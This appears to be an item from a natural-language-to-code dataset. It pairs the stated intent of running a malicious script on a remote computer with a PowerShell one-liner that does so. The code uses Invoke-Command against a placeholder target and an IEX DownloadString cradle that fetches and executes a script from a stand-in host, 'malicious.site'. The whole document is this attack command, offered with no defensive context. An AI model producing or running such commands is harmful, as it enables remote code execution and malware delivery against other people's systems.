# Natural language intent:
# Invoke a command on a remote computer to download and execute a malicious script.

Invoke-Command -ComputerName <target> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script') }
